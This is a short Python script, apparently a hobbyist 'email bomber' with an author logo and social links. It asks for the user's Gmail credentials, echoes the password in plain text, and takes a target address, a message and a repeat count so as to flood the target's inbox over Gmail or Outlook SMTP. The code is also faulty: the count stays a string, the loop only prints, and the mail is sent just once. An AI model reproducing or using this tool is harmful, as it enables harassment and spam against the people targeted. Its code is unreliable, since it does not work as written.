print( )

print( )

print( )

import smtplib

import time

logo = """

   Ali Raza XD

   ▄︻̷̿┻̿═━一

   THE ANONYMOUS

   THE LEGEND ℒℴνℯ

   THE GAME CHANGER ℒℴνℯ

   Bangladeshi

   ℒℴνℯ ▄︻̷̿┻̿═━一

\033[1;91m=======================================

\033[1;96mAuthor  \033[1;93m: \033[1;92MAli Raza XD

\033[1;96mYouTube \033[1;93m: \033[1;92mMahummad Ayaan Tricks channel

\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/MahummadAyaanTricksz

\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/profile.php?id=100012691603222

\033[1;91m======================================="""

print(logo)

print( )

print( )

print( )

mail=smtplib.SMTP('smtp.gmail.com',587)

email=str(input("Enter your gmail address: "))

print("Your Email is :"+email)

print( )

print( )

password=input("Enter your gmail_password: ")

print("Your Password is :"+password)

print( )

print( )

bmail=input("Enter Your Target Email : ")

print("Your Target Mail is :"+bmail)

print( )

print( )

message=input("Enter Message: ")

print( )

print( )

counter=(input("Enter Your Ammount :"))

print("Your Ammount is :"+counter)

print( )

print( )

s=input('Select the service provider (Gmail / Outlook): ').lower()

print("Method :"+s)

print( )

print( )

if s=="gmail":

	mail=smtplib.SMTP('smtp.gmail.com','587')

elif s== "outlook":

	mail = smtplib.SMTP('smtp.office365.com',587)

for x in range(0,counter):

	print("Number of Message Sent : ", x+1)

	

mail.ehlo()

mail.starttls()

mail.login(email,password)

mail.sendmail(email,bmail,message)
